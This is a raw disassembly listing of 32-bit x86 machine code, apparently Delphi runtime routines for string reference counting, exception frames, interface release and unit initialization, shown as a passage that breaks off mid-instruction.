  4042a4:	8b 08                	mov    (%eax),%ecx
  4042a6:	85 c9                	test   %ecx,%ecx
  4042a8:	74 33                	je     0x4042dd
  4042aa:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  4042b0:	f0 ff 49 f8          	lock decl -0x8(%ecx)
  4042b4:	75 27                	jne    0x4042dd
  4042b6:	50                   	push   %eax
  4042b7:	89 c8                	mov    %ecx,%eax
  4042b9:	31 c9                	xor    %ecx,%ecx
  4042bb:	8a 4a 01             	mov    0x1(%edx),%cl
  4042be:	8b 54 11 06          	mov    0x6(%ecx,%edx,1),%edx
  4042c2:	85 d2                	test   %edx,%edx
  4042c4:	74 0e                	je     0x4042d4
  4042c6:	8b 48 fc             	mov    -0x4(%eax),%ecx
  4042c9:	85 c9                	test   %ecx,%ecx
  4042cb:	74 07                	je     0x4042d4
  4042cd:	8b 12                	mov    (%edx),%edx
  4042cf:	e8 c4 fa ff ff       	call   0x403d98
  4042d4:	83 e8 08             	sub    $0x8,%eax
  4042d7:	e8 84 e5 ff ff       	call   0x402860
  4042dc:	58                   	pop    %eax
  4042dd:	c3                   	ret
  4042de:	8b c0                	mov    %eax,%eax
  4042e0:	53                   	push   %ebx
  4042e1:	8b 18                	mov    (%eax),%ebx
  4042e3:	85 d2                	test   %edx,%edx
  4042e5:	74 04                	je     0x4042eb
  4042e7:	f0 ff 42 f8          	lock incl -0x8(%edx)
  4042eb:	85 db                	test   %ebx,%ebx
  4042ed:	74 14                	je     0x404303
  4042ef:	f0 ff 4b f8          	lock decl -0x8(%ebx)
  4042f3:	75 0e                	jne    0x404303
  4042f5:	50                   	push   %eax
  4042f6:	52                   	push   %edx
  4042f7:	89 ca                	mov    %ecx,%edx
  4042f9:	ff 43 f8             	incl   -0x8(%ebx)
  4042fc:	e8 a3 ff ff ff       	call   0x4042a4
  404301:	5a                   	pop    %edx
  404302:	58                   	pop    %eax
  404303:	89 10                	mov    %edx,(%eax)
  404305:	5b                   	pop    %ebx
  404306:	c3                   	ret
  404307:	90                   	nop
  404308:	55                   	push   %ebp
  404309:	8b ec                	mov    %esp,%ebp
  40430b:	83 c4 f8             	add    $0xfffffff8,%esp
  40430e:	53                   	push   %ebx
  40430f:	56                   	push   %esi
  404310:	57                   	push   %edi
  404311:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404314:	a1 28 60 42 00       	mov    0x426028,%eax
  404319:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40431c:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  404320:	74 39                	je     0x40435b
  404322:	33 c0                	xor    %eax,%eax
  404324:	55                   	push   %ebp
  404325:	68 43 43 40 00       	push   $0x404343
  40432a:	64 ff 30             	push   %fs:(%eax)
  40432d:	64 89 20             	mov    %esp,%fs:(%eax)
  404330:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  404333:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404336:	ff 53 04             	call   *0x4(%ebx)
  404339:	33 c0                	xor    %eax,%eax
  40433b:	5a                   	pop    %edx
  40433c:	59                   	pop    %ecx
  40433d:	59                   	pop    %ecx
  40433e:	64 89 10             	mov    %edx,%fs:(%eax)
  404341:	eb 0a                	jmp    0x40434d
  404343:	e9 94 ec ff ff       	jmp    0x402fdc
  404348:	e8 47 ee ff ff       	call   0x403194
  40434d:	8b 45 f8             	mov    -0x8(%ebp),%eax
  404350:	8b 00                	mov    (%eax),%eax
  404352:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404355:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  404359:	75 c7                	jne    0x404322
  40435b:	5f                   	pop    %edi
  40435c:	5e                   	pop    %esi
  40435d:	5b                   	pop    %ebx
  40435e:	59                   	pop    %ecx
  40435f:	59                   	pop    %ecx
  404360:	5d                   	pop    %ebp
  404361:	c3                   	ret
  404362:	8b c0                	mov    %eax,%eax
  404364:	8b 15 24 60 42 00    	mov    0x426024,%edx
  40436a:	89 10                	mov    %edx,(%eax)
  40436c:	a3 24 60 42 00       	mov    %eax,0x426024
  404371:	c3                   	ret
  404372:	8b c0                	mov    %eax,%eax
  404374:	55                   	push   %ebp
  404375:	8b ec                	mov    %esp,%ebp
  404377:	83 c4 f8             	add    $0xfffffff8,%esp
  40437a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40437d:	33 c0                	xor    %eax,%eax
  40437f:	55                   	push   %ebp
  404380:	68 ed 43 40 00       	push   $0x4043ed
  404385:	64 ff 30             	push   %fs:(%eax)
  404388:	64 89 20             	mov    %esp,%fs:(%eax)
  40438b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40438e:	8b 40 04             	mov    0x4(%eax),%eax
  404391:	e8 72 ff ff ff       	call   0x404308
  404396:	33 c0                	xor    %eax,%eax
  404398:	5a                   	pop    %edx
  404399:	59                   	pop    %ecx
  40439a:	59                   	pop    %ecx
  40439b:	64 89 10             	mov    %edx,%fs:(%eax)
  40439e:	68 f4 43 40 00       	push   $0x4043f4
  4043a3:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4043a6:	3b 05 24 60 42 00    	cmp    0x426024,%eax
  4043ac:	75 0c                	jne    0x4043ba
  4043ae:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4043b1:	8b 00                	mov    (%eax),%eax
  4043b3:	a3 24 60 42 00       	mov    %eax,0x426024
  4043b8:	eb 32                	jmp    0x4043ec
  4043ba:	a1 24 60 42 00       	mov    0x426024,%eax
  4043bf:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4043c2:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  4043c6:	74 24                	je     0x4043ec
  4043c8:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4043cb:	8b 00                	mov    (%eax),%eax
  4043cd:	3b 45 fc             	cmp    -0x4(%ebp),%eax
  4043d0:	75 0c                	jne    0x4043de
  4043d2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4043d5:	8b 00                	mov    (%eax),%eax
  4043d7:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4043da:	89 02                	mov    %eax,(%edx)
  4043dc:	eb 0e                	jmp    0x4043ec
  4043de:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4043e1:	8b 00                	mov    (%eax),%eax
  4043e3:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4043e6:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  4043ea:	75 dc                	jne    0x4043c8
  4043ec:	c3                   	ret
  4043ed:	e9 16 ed ff ff       	jmp    0x403108
  4043f2:	eb af                	jmp    0x4043a3
  4043f4:	59                   	pop    %ecx
  4043f5:	59                   	pop    %ecx
  4043f6:	5d                   	pop    %ebp
  4043f7:	c3                   	ret
  4043f8:	8b 10                	mov    (%eax),%edx
  4043fa:	85 d2                	test   %edx,%edx
  4043fc:	74 0e                	je     0x40440c
  4043fe:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  404404:	50                   	push   %eax
  404405:	52                   	push   %edx
  404406:	8b 02                	mov    (%edx),%eax
  404408:	ff 50 08             	call   *0x8(%eax)
  40440b:	58                   	pop    %eax
  40440c:	c3                   	ret
  40440d:	8d 40 00             	lea    0x0(%eax),%eax
  404410:	85 d2                	test   %edx,%edx
  404412:	74 19                	je     0x40442d
  404414:	52                   	push   %edx
  404415:	50                   	push   %eax
  404416:	8b 02                	mov    (%edx),%eax
  404418:	52                   	push   %edx
  404419:	ff 50 04             	call   *0x4(%eax)
  40441c:	58                   	pop    %eax
  40441d:	8b 08                	mov    (%eax),%ecx
  40441f:	8f 00                	pop    (%eax)
  404421:	85 c9                	test   %ecx,%ecx
  404423:	75 01                	jne    0x404426
  404425:	c3                   	ret
  404426:	8b 01                	mov    (%ecx),%eax
  404428:	51                   	push   %ecx
  404429:	ff 50 08             	call   *0x8(%eax)
  40442c:	c3                   	ret
  40442d:	8b 08                	mov    (%eax),%ecx
  40442f:	85 c9                	test   %ecx,%ecx
  404431:	89 10                	mov    %edx,(%eax)
  404433:	74 06                	je     0x40443b
  404435:	8b 01                	mov    (%ecx),%eax
  404437:	51                   	push   %ecx
  404438:	ff 50 08             	call   *0x8(%eax)
  40443b:	c3                   	ret
  40443c:	55                   	push   %ebp
  40443d:	8b ec                	mov    %esp,%ebp
  40443f:	83 c4 f0             	add    $0xfffffff0,%esp
  404442:	53                   	push   %ebx
  404443:	33 d2                	xor    %edx,%edx
  404445:	89 55 f0             	mov    %edx,-0x10(%ebp)
  404448:	33 d2                	xor    %edx,%edx
  40444a:	55                   	push   %ebp
  40444b:	68 a2 44 40 00       	push   $0x4044a2
  404450:	64 ff 32             	push   %fs:(%edx)
  404453:	64 89 22             	mov    %esp,%fs:(%edx)
  404456:	6a 07                	push   $0x7
  404458:	8d 55 f5             	lea    -0xb(%ebp),%edx
  40445b:	52                   	push   %edx
  40445c:	68 04 10 00 00       	push   $0x1004
  404461:	50                   	push   %eax
  404462:	e8 55 cc ff ff       	call   0x4010bc
  404467:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40446a:	8d 55 f5             	lea    -0xb(%ebp),%edx
  40446d:	b9 07 00 00 00       	mov    $0x7,%ecx
  404472:	e8 65 f4 ff ff       	call   0x4038dc
  404477:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40447a:	8d 55 fc             	lea    -0x4(%ebp),%edx
  40447d:	e8 32 e6 ff ff       	call   0x402ab4
  404482:	8b d8                	mov    %eax,%ebx
  404484:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  404488:	74 02                	je     0x40448c
  40448a:	33 db                	xor    %ebx,%ebx
  40448c:	33 c0                	xor    %eax,%eax
  40448e:	5a                   	pop    %edx
  40448f:	59                   	pop    %ecx
  404490:	59                   	pop    %ecx
  404491:	64 89 10             	mov    %edx,%fs:(%eax)
  404494:	68 a9 44 40 00       	push   $0x4044a9
  404499:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40449c:	e8 f3 f1 ff ff       	call   0x403694
  4044a1:	c3                   	ret
  4044a2:	e9 61 ec ff ff       	jmp    0x403108
  4044a7:	eb f0                	jmp    0x404499
  4044a9:	8b c3                	mov    %ebx,%eax
  4044ab:	5b                   	pop    %ebx
  4044ac:	8b e5                	mov    %ebp,%esp
  4044ae:	5d                   	pop    %ebp
  4044af:	c3                   	ret
  4044b0:	55                   	push   %ebp
  4044b1:	8b ec                	mov    %esp,%ebp
  4044b3:	33 c0                	xor    %eax,%eax
  4044b5:	55                   	push   %ebp
  4044b6:	68 fa 44 40 00       	push   $0x4044fa
  4044bb:	64 ff 30             	push   %fs:(%eax)
  4044be:	64 89 20             	mov    %esp,%fs:(%eax)
  4044c1:	ff 05 a4 95 42 00    	incl   0x4295a4
  4044c7:	75 23                	jne    0x4044ec
  4044c9:	b8 38 90 42 00       	mov    $0x429038,%eax
  4044ce:	e8 f9 e4 ff ff       	call   0x4029cc
  4044d3:	b8 04 92 42 00       	mov    $0x429204,%eax
  4044d8:	e8 ef e4 ff ff       	call   0x4029cc
  4044dd:	b8 d0 93 42 00       	mov    $0x4293d0,%eax
  4044e2:	e8 e5 e4 ff ff       	call   0x4029cc
  4044e7:	e8 6c d5 ff ff       	call   0x401a58
  4044ec:	33 c0                	xor    %eax,%eax
  4044ee:	5a                   	pop    %edx
  4044ef:	59                   	pop    %ecx
  4044f0:	59                   	pop    %ecx
  4044f1:	64 89 10             	mov    %edx,%fs:(%eax)
  4044f4:	68 01 45 40 00       	push   $0x404501
  4044f9:	c3                   	ret
  4044fa:	e9 09 ec ff ff       	jmp    0x403108
  4044ff:	eb f8                	jmp    0x4044f9
  404501:	5d                   	pop    %ebp
  404502:	c3                   	ret
  404503:	90                   	nop
  404504:	83 2d a4 95 42 00 01 	subl   $0x1,0x4295a4
  40450b:	0f 83 c5 00 00 00    	jae    0x4045d6
  404511:	c6 05 08 60 42 00 02 	movb   $0x2,0x426008
  404518:	c7 05 10 90 42 00 7c 	movl   $0x40107c,0x429010
  40451f:	10 40 00 
  404522:	c7 05 14 90 42 00 84 	movl   $0x401084,0x429014
  404529:	10 40 00 
  40452c:	c6 05 36 90 42 00 02 	movb   $0x2,0x429036
  404533:	c7 05 00 90 42 00 bc 	movl   $0x4040bc,0x429000
  40453a:	40 40 00 
  40453d:	e8 d2 e6 ff ff       	call   0x402c14
  404542:	84 c0                	test   %al,%al
  404544:	74 05                	je     0x40454b
  404546:	e8 f9 e6 ff ff       	call   0x402c44
  40454b:	e8 b8 e7 ff ff       	call   0x402d08
  404550:	66 c7 05 3c 90 42 00 	movw   $0xd7b0,0x42903c
  404557:	b0 d7 
